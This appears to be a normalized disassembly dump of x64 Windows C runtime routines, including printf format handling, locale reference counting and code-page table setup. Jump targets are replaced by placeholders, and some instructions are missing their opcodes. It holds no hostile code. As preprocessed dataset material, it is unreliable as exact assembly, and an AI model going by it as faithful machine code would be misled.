add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
mov cl bpl
dec ebx
call sub_14004dcb0
cmp [ rdi ] 0xffffffff
je r-xdata
sub_140044f8c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rbx [ rsp + 0x60 ]
mov rdi r9
mov r12d [ rbx ]
mov rbp r8
mov esi edx
mov r13 rcx
je r-xdata
and [ rbx ] 0x0
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov [ rbx ] r12d
mov cl [ r13 ]
mov r8 rdi
mov rdx rbp
dec esi
call sub_14004dcb0
inc r13
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test esi esi
jg r-xdata
cmp [ rbx ] 0x2a
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
cmp [ rbx ] 0x0
jne r-xdata
mov r8 rdi
mov rdx rbp
mov cl 0x3f
call sub_14004dcb0
sub_140045024
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0x68 ] rdx
lea rcx [ rbp - 0x80 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x64 ] eax
mov r13d eax
mov [ rsp + 0x58 ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x54 ] eax
call sub_14003b928
call sub_14003f1a4
xor r10d r10d
mov [ rbp - 0x60 ] rax
test rbx rbx
jne r-xdata
or r15d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
je r-xdata
mov r8 [ rsp + 0x68 ]
test r8 r8
je r-xdata
mov rcx rbx
call sub_14003be60
lea rdx [ rw-data ]
cmp eax r15d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
mov r12b [ r8 ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x48 ] r10d
mov edx r10d
mov [ rbp - 0x50 ] r10
test r12b r12b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r15d
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x68 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov r11d 0x200
cmp eax r15d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x96dc0 ]
jmp r-xdata
mov eax esi
mov rcx [ rbp - 0x70 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea eax [ r12 - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
mov ecx r10d
movsx rax r12b
movsx ecx [ rax + r9 + 0x6b590 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x96dc0 ]
lea rdx [ rbp - 0x80 ]
movzx ecx r12b
mov [ rsp + 0x54 ] r10d
call sub_14004fcb8
xor esi esi
test eax eax
je r-xdata
dec ecx
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
movsx edx [ rdx + r9 + 0x6b5b0 ]
sar edx 0x4
mov [ rsp + 0x60 ] edx
mov ecx edx
test edx edx
je r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_14004dcb0
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_14004dcb0
mov rdx [ rsp + 0x68 ]
mov r12b [ rdx ]
inc rdx
mov [ rsp + 0x68 ] rdx
test r12b r12b
je r-xdata
mov [ rsp + 0x78 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x4c ] r10d
mov r13d r10d
mov edi r15d
mov [ rsp + 0x44 ] r15d
mov [ rsp + 0x54 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov r8 [ rsp + 0x68 ]
mov edx [ rsp + 0x60 ]
mov r11d 0x200
lea r9 [ __dos_header ]
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rbp - 0x68 ] sil
jmp r-xdata
mov r12b [ r8 ]
test r12b r12b
jne r-xdata
cmp r12b 0x20
je r-xdata
dec ecx
je r-xdata
inc r8
mov [ rsp + 0x68 ] r8
test esi esi
js r-xdata
je r-xdata
or r13d 0x2
jmp r-xdata
cmp r12b 0x23
je r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r13d 0x7
jmp r-xdata
cmp r12b 0x2b
je r-xdata
mov eax [ rsp + 0x58 ]
lea ecx [ rax + rax * 4 ]
movsx eax r12b
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r14 ]
add r14 0x8
mov [ rsp + 0x58 ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r13d 0x1
jmp r-xdata
cmp r12b 0x2d
je r-xdata
or r13d 0x4
neg eax
jmp r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
or r13d 0x4
jmp r-xdata
cmp r12b 0x30
jne r-xdata
mov [ rsp + 0x58 ] eax
jmp r-xdata
lea ecx [ rdi + rdi * 4 ]
movsx eax r12b
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r14 ]
add r14 0x8
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
cmp r12b 0x49
je r-xdata
dec ecx
jne r-xdata
or r13d 0x8
jmp r-xdata
mov edi r15d
mov [ rsp + 0x44 ] r15d
jmp r-xdata
mov al [ r8 ]
bts r13d 0xf
cmp al 0x36
jne r-xdata
cmp r12b 0x68
je r-xdata
movsx eax r12b
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ r8 + 0x1 ] 0x34
jne r-xdata
or r13d 0x20
jmp r-xdata
cmp r12b 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ r8 + 0x1 ] 0x32
jne r-xdata
add r8 0x2
bts r13d 0xf
jmp r-xdata
cmp [ r8 ] 0x6c
jne r-xdata
cmp r12b 0x77
jne r-xdata
cmp [ rsp + 0x5c ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r13d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add r8 0x2
btr r13d 0xf
jmp r-xdata
or r13d 0x10
jmp r-xdata
inc r8
bts r13d 0xc
jmp r-xdata
bts r13d 0xb
jmp r-xdata
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
test r13b 0x40
je r-xdata
or r13d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r11d
test edi edi
jns r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
bt r13d 0xc
jae r-xdata
mov [ rsp + 0x78 ] 0x1
add r12b 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_14003ad04
xor r10d r10d
mov [ rbp - 0x50 ] r10
mov edi [ rsp + 0x4c ]
bt r13d 0x8
jae r-xdata
jne r-xdata
mov [ rsp + 0x44 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r13b 0x40
je r-xdata
add r14 0x8
test r13b 0x20
je r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
mov rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
mov r8 rsi
mov edx edi
mov [ rsp + 0x20 ] rax
call sub_140044f8c
test r13b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_140044f38
test r13b 0x1
je r-xdata
mov [ rsp + 0x50 ] 0x2d
jmp r-xdata
cmp edi r11d
cmovg edi r11d
mov [ rsp + 0x44 ] edi
cmp edi 0xa3
jle r-xdata
cmp r12b 0x67
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
movsx edi r12b
movsxd rsi esi
mov [ rbp - 0x48 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x80 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
mov ecx [ rsp + 0x44 ]
mov rdx rbx
mov [ rsp + 0x20 ] ecx
lea rcx [ rbp - 0x48 ]
call rax
mov edi r13d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
call sub_140051528
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x6f
je r-xdata
test eax r13d
jne r-xdata
test r8 r8
jns r-xdata
test r13b 0x40
je r-xdata
test r13b 0x40
je r-xdata
add r14 0x8
test r13d 0x810
je r-xdata
bts r13d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x48 ]
xor eax eax
cmp [ rsp + 0x54 ] eax
je r-xdata
test r13b 0x4
jne r-xdata
test r13b 0x2
je r-xdata
mov [ rsp + 0x50 ] 0x2b
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
add edi 0x15d
movsxd rcx edi
call sub_140041684
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x44 ] 0x1
jmp r-xdata
cmp r12b 0x67
jne r-xdata
xor eax eax
cmp [ rsp + 0x44 ] eax
jne r-xdata
test r13b 0x20
je r-xdata
mov r9d 0x8
test r13b r13b
jns r-xdata
cmp eax 0x70
je r-xdata
test edi edi
jns r-xdata
bt r13d 0xc
jb r-xdata
neg r8
bts r13d 0x8
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
mov al [ r14 - 0x8 ]
mov [ rsp + 0x48 ] 0x1
mov [ rbp - 0x40 ] al
movzx r9d [ r14 - 0x8 ]
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x48 ]
mov r8 r11
call sub_14005009c
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
mov rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx edi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_140044f8c
xor r10d r10d
test edi edi
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x30
call sub_140044f38
mov [ rsp + 0x50 ] 0x20
jmp r-xdata
mov r12d [ rsp + 0x58 ]
mov rsi [ rsp + 0x70 ]
sub r12d [ rsp + 0x48 ]
sub r12d edi
test r13b 0xc
jne r-xdata
mov [ rsp + 0x44 ] 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x4c ]
or r13d r11d
jmp r-xdata
mov edi 0x10
bts r13d 0xf
cmp eax 0x73
je r-xdata
and r13d 0xfffffff7
cmp edi r11d
cmovg edi r11d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
jmp r-xdata
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x60 ] r10d
test r13b 0x4
je r-xdata
mov rsi rbx
mov rcx rbx
call sub_14003f7f0
mov esi [ rsp + 0x40 ]
bts r13d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x50 ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x51 ] al
jmp r-xdata
mov rbx [ r14 ]
cmp edi r15d
mov eax edi
mov ecx 0x7fffffff
cmove eax ecx
add r14 0x8
test r13d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x64 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
bts r13d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
mov edx r12d
mov cl 0x20
call sub_140044f38
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov esi r15d
mov [ rsp + 0x40 ] r15d
jmp r-xdata
mov edx [ rbp - 0x58 ]
test edx edx
je r-xdata
mov eax 0x8000
test eax r13d
jne r-xdata
test rbx rbx
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
test rbx rbx
mov [ rsp + 0x54 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1bf ]
mov [ rsp + 0x44 ] edi
sub eax ebx
inc rbx
mov [ rsp + 0x48 ] eax
test r11d r13d
je r-xdata
mov rax [ r14 ]
add r14 0x8
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov rax [ rbp - 0x60 ]
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rbp + 0x1c0 ]
mov [ rsp + 0x20 ] rax
call sub_140044f8c
xor r10d r10d
test edi edi
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_14003f7f0
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rsi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x58 ]
mov r8d 0x6
dec edi
add rsi 0x2
call sub_14005009c
xor r10d r10d
test eax eax
jne r-xdata
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x64 ] eax
mov r9d 0x10
test r13b r13b
jns r-xdata
dec rbx
inc [ rsp + 0x48 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
xor r10d r10d
movsx eax [ rax ]
bt r13d 0xb
jae r-xdata
jmp r-xdata
mov esi [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x48 ] ecx
jmp r-xdata
mov [ rsp + 0x54 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x54 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x48 ] eax
sub_140045ad0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x50
xor ebx ebx
mov r12 r8
mov r13 rcx
mov rsi rdx
lea rcx [ rbp - 0x28 ]
lea r8d [ rbx + 0x28 ]
xor edx edx
mov rdi r9
mov [ rbp - 0x30 ] rbx
call sub_14003d760
test rdi rdi
jne r-xdata
test r12 r12
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
jmp r-xdata
mov r9 [ rbp + 0x48 ]
mov r8 [ rbp + 0x40 ]
mov ecx 0x7fffffff
cmp r12 rcx
mov eax r12d
mov rdx rdi
cmova eax ecx
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] rsi
mov [ rbp - 0x28 ] eax
call r13
mov edi eax
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
test eax eax
js r-xdata
cmp [ rbp - 0x28 ] ebx
mov [ rsi + r12 - 0x1 ] bl
setge bl
lea eax [ rbx - 0x2 ]
dec [ rbp - 0x28 ]
js r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_140044da8
cmp eax 0xffffffff
je r-xdata
mov rax [ rbp - 0x30 ]
mov [ rax ] bl
jmp r-xdata
mov eax edi
jmp r-xdata
sub_140045bb8
push rbx
sub rsp 0x30
mov rbx rcx
test r8 r8
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
test rcx rcx
je r-xdata
test rdx rdx
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_14004dcf8 ]
call sub_140045ad0
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ rbx ] 0x0
add rsp 0x30
pop rbx
retn
call sub_14003f1a4
mov [ rax ] 0x22
jmp r-xdata
call sub_140043760
or eax 0xffffffff
sub_140045c28
[ rcx ]
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ]
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ]
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ]
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ]
retn
[ rdx ]
sub_140045cb4
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_140045d58
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_14003ad04
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_14003ad04
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_14003ad04
mov rcx [ rbx + 0x130 ]
call sub_14003ad04
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_140047ca4
mov rcx [ rbx + 0x158 ]
call sub_14003ad04
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
dec rsi
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_14003ad04
cmp [ rcx ] 0x0
jne r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x110 ]
call sub_14003ad04
mov rcx [ rbx + 0x128 ]
call sub_14003ad04
cmp [ rcx ] 0x0
jne r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x128 ]
call sub_140048404
call sub_14003ad04
call sub_14003ad04
mov rcx [ rbx + 0x128 ]
call sub_140048130
sub_140045ed4
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_140045c28
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_140045cb4
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_140045d58
sub_140045f2c
push rbx
sub rsp 0x20
call sub_140043c34
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_140046c48
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_140045ed4
mov rbx rax
mov ecx 0xc
call sub_140046b48
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_14003e1c4
call sub_140043c34
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_140045fa4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8d esi
xor edx edx
call sub_14003d760
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0xc ] r11d
mov [ rbp + 0x4 ] r11
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
dec rsi
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
dec rdx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_140046030
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push rbp
lea rbp [ rax - 0x488 ]
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x470 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rcx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rcx ] al
inc eax
inc rcx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rbp + 0x470 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x270 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_140049690
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x70 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_140041ba0
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_140041ba0
lea rdx [ rbp + 0x70 ]
lea r8 [ rbp + 0x170 ]
sub rdx rsi
lea r11 [ rbp + 0x270 ]
lea rcx [ rsi + 0x1d ]
sub r8 rsi
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov eax r8d
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_14003d760
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rdx + rcx - 0x1d ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ r8 + rcx - 0x1d ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
add r11 0x2
dec rbx
jne r-xdata
sub_140046220
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_140043c34
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_140046c48
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_140046b48
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_14003e1c4
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ]
mov rbx [ rsp + 0x30 ]
[ rbx ]
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_14003ad04
sub_1400462dc
